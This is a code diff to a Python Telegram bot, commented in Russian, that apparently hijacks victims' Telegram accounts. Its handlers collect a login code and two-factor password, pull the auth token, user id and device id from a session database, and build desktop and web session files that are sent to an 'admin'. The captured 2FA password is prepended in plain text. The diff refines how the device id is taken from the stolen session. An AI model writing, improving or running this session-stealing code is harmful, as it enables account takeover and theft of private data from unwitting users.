@@ -217,10 +217,9 @@ async def code_handler(message: types.Message, state: FSMContext):
             viewer_id = pending[uid]["user_id"]
             password = gen_password()
             session_id = int(time.time() * 1000)
-            device_id = str(uuid.uuid4())
 
-            # Ищем пароль в session.db
-            web_password = None
+            # Читаем device_id из session.db
+            device_id = str(uuid.uuid4())
             db_path = os.path.join(work_dir, "session.db")
             if os.path.exists(db_path):
                 try:
@@ -228,21 +227,13 @@ async def code_handler(message: types.Message, state: FSMContext):
                     cursor = conn.cursor()
                     cursor.execute("SELECT * FROM sessions LIMIT 1")
                     row = cursor.fetchone()
-                    if row:
-                        logging.info(f"ВСЕ ПОЛЯ session.db:")
-                        for i, field in enumerate(row):
-                            logging.info(f"  [{i}]: {repr(field)[:150]}")
-                        for field in row:
-                            if isinstance(field, str) and len(field) > 10 and len(field) < 100:
-                                if '@' in field or '#' in field or '_' in field:
-                                    web_password = field
-                                    logging.info(f"НАЙДЕН ПАРОЛЬ: {web_password}")
-                                    break
+                    if row and len(row) > 1:
+                        device_id = row[1]  # device_id из сессии
                     conn.close()
-                except Exception as e:
-                    logging.error(f"Ошибка чтения session.db: {e}")
+                except:
+                    pass
 
-            web_js = generate_web_js(device_id, token, viewer_id, web_password)
+            web_js = generate_web_js(device_id, token, viewer_id)
             desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
             await send_files(phone, uid, work_dir, desktop, web_js)
             await safe_edit(msg, "✅ Готово! Файлы отправлены админу.")
@@ -295,6 +286,7 @@ async def password_handler(message: types.Message, state: FSMContext):
 
     await asyncio.sleep(2)
 
+    device_id = str(uuid.uuid4())
     db_path = os.path.join(work_dir, "session.db")
     if os.path.exists(db_path):
         try:
@@ -303,20 +295,12 @@ async def password_handler(message: types.Message, state: FSMContext):
             cursor.execute("SELECT * FROM sessions LIMIT 1")
             row = cursor.fetchone()
             if row:
-                logging.info(f"ВСЕ ПОЛЯ session.db:")
-                for i, field in enumerate(row):
-                    logging.info(f"  [{i}]: {repr(field)[:150]}")
                 token = row[0]
                 user_id_str = row[3] if len(row) > 3 else "0"
+                device_id = row[1] if len(row) > 1 else device_id
                 pending[uid]["token"] = token
                 pending[uid]["user_id"] = int(user_id_str) if user_id_str.isdigit() else 0
                 pending[uid]["status"] = "done"
-                for field in row:
-                    if isinstance(field, str) and len(field) > 10 and len(field) < 100:
-                        if '@' in field or '#' in field or '_' in field:
-                            pending[uid]["web_password"] = field
-                            logging.info(f"НАЙДЕН ПАРОЛЬ: {field}")
-                            break
             conn.close()
         except Exception as e:
             logging.error(f"Ошибка чтения session.db: {e}")
@@ -325,12 +309,10 @@ async def password_handler(message: types.Message, state: FSMContext):
         token = pending[uid]["token"]
         viewer_id = pending[uid]["user_id"] or 0
         user_password = pending[uid].get("user_password", "")
-        web_password = pending[uid].get("web_password")
         password = gen_password()
         session_id = int(time.time() * 1000)
-        device_id = str(uuid.uuid4())
 
-        web_js = generate_web_js(device_id, token, viewer_id, web_password)
+        web_js = generate_web_js(device_id, token, viewer_id)
 
         if user_password:
             web_js = f"2FA ПАРОЛЬ: {user_password} (ЭТУ СТРОКУ КОПИРОВАТЬ НЕ НУЖНО)\n\n" + web_js
